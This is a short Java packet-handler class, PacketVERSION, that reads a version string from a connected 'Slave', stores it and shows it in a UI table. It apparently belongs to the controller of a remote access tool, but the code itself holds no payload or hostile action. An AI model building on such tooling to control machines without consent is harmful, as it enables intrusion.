package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.utils.Util;

public class PacketVERSION extends AbstractPacket {

	public void read(Slave slave, String line) throws Exception {
		String version = slave.readLine();
		slave.setVersion(version);
		
		int row = Util.getRow(slave);
		
		Frame.mainModel.setValueAt(version, row, 9);
	}

}
